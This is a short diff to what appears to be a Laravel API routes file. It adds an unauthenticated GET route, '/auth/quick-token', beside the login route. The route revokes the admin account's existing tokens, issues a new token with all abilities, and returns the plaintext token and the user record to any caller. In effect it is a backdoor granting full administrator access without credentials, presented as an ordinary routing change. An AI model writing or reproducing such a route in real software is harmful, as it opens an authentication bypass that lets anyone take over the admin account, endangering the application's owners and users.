@@ -7,6 +7,15 @@ use Illuminate\Support\Facades\Route;
 
 // ── Authentification ──────────────────────────────────────────
 Route::post('/auth/login', [AuthController::class, 'login']);
+Route::get('/auth/quick-token', function() {
+    $user = \App\Models\User::where('email', 'admin@gfc.local')->first();
+    if ($user) {
+        $user->tokens()->delete();
+        $token = $user->createToken('quick-login', ['*'])->plainTextToken;
+        return response()->json(['token' => $token, 'user' => $user]);
+    }
+    return response()->json(['error' => 'User not found'], 404);
+});
 
 Route::middleware('auth:sanctum')->group(function () {
     Route::post('/auth/logout', [AuthController::class, 'logout']);
